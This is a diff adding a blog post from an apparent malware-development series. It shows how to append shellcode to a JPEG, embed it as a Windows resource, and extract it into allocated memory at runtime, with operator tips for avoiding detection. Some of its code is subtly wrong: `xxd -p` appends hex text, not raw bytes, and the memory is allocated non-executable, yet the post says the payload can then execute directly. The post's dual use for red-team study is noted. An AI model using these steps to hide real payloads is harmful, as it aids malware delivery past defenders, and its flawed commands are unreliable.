@@ -1,0 +1,120 @@
+---
+title: "Shellcode in image carriers: practical notes"
+description: "How image-concatenation carriers work, how payload extraction by offset is done, and where this trick helps or fails in real operations."
+date: 2023-03-25
+tags: ["windows", "malware-dev", "payload-delivery", "red-team", "windows-internals-series"]
+---
+
+Part 5 of the series. This follows payload storage and focuses on one specific carrier pattern: hiding payload bytes behind valid image data.
+
+The core idea is simple: append payload bytes to a legitimate image. Most image viewers parse only what they need and ignore trailing bytes, so the image still opens normally.
+
+## The workflow
+
+I use this as a two-stage process:
+
+1. Create a valid image file
+2. Append payload bytes after the image end
+3. Embed the combined file as a resource
+4. Extract by known offset at runtime
+
+The offset is the original image length.
+
+## Building the carrier
+
+Get image byte count:
+
+```bash
+xxd -i saturn.jpg
+```
+
+Get payload byte count:
+
+```bash
+xxd -i msgbox64.bin
+```
+
+Append payload to image:
+
+```bash
+xxd -p msgbox64.bin | tr -d "\n" >> saturn.jpg
+```
+
+Now `saturn.jpg` is both:
+
+- a valid image file
+- a payload carrier
+
+## Embedding as resource
+
+```rc
+#include "resources.h"
+IMAGE RCDATA "saturn.jpg"
+```
+
+```c
+#define IMAGE 100
+```
+
+Runtime extraction from `.rsrc`:
+
+```c
+res = FindResourceA(NULL, MAKEINTRESOURCE(IMAGE), RT_RCDATA);
+resHandle = LoadResource(NULL, res);
+image = (char *)LockResource(resHandle);
+image_len = SizeofResource(NULL, res);
+```
+
+At this point:
+
+- `image` points to the first byte of the carrier
+- `image_len` is the total carrier size (image plus payload)
+
+## Recovering payload bytes
+
+If the original image length is known, payload start is:
+
+```c
+offset = image + original_image_length;
+```
+
+Then copy payload bytes out:
+
+```c
+memcpy(p0, offset, payload_len);
+exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+RtlMoveMemory(exec_mem, p0, payload_len);
+```
+
+From there you can inject, queue APC, or execute directly depending on your chain.
+
+## Why this trick works
+
+It works because file format parsers are not shellcode detectors. They parse headers and structured chunks, then stop. Trailing bytes are often ignored.
+
+That gives you a camouflage layer:
+
+- static file checks say "valid jpg"
+- payload bytes still travel with the file
+
+## Where it fails
+
+This is not stealth by itself. It fails fast when defenders inspect:
+
+- trailing-byte anomalies in media files
+- high entropy tails in images
+- resource blobs that exceed normal size profiles
+- runtime memory behavior after extraction
+
+So image carriers are about transport and packaging convenience, not guaranteed bypass.
+
+## Practical operator notes
+
+- Keep carrier sizes believable; huge avatars with tiny visible content stand out
+- Rotate images and payload wrappers to avoid byte-for-byte reuse
+- Treat offsets as build artifacts, not hardcoded magic numbers in source
+- Validate extraction under malformed image conditions; parser assumptions break in the field
+
+For authorized red team labs, this is a useful pattern to understand packaging tradeoffs. For real operations against mature detection stacks, the runtime stage is still where you win or lose.
+
+Next part moves to execution mechanics: classic and modern remote code injection paths.
